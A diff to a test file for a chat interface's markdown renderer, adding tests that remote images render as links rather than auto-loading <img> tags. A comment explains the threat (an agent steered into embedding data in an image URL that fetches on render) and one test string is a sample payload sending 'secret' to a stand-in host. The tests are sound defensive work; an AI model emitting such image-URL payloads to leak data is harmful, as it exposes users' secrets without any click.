@@ -37,3 +37,28 @@ describe("what a drawing renders as", () => {
     expect(html("a sentence")).toContain("max-w-[72ch]");
   });
 });
+
+/**
+ * A remote picture is a link, not a request. The shell's `img-src` allows any
+ * http(s) origin (for posters), so an `<img>` here would be fetched the moment
+ * the message renders — a way out for whatever an agent was steered into
+ * putting in the URL, with nobody clicking anything.
+ */
+describe("what a picture renders as", () => {
+  it("draws a remote one as a link, and never as an <img>", () => {
+    const out = html("![chart](https://elsewhere.example/?d=secret)");
+    expect(out).not.toContain("<img");
+    expect(out).toContain('href="https://elsewhere.example/?d=secret"');
+    expect(out).toContain(">chart</a>");
+  });
+
+  it("names the link by its URL when there is no alt text", () => {
+    const out = html("![](//elsewhere.example/x.png)");
+    expect(out).not.toContain("<img");
+    expect(out).toContain(">//elsewhere.example/x.png</a>");
+  });
+
+  it("still draws an inline data: picture, which fetches nothing", () => {
+    expect(html("![dot](data:image/png;base64,iVBORw0KGgo=)")).toContain("<img");
+  });
+});
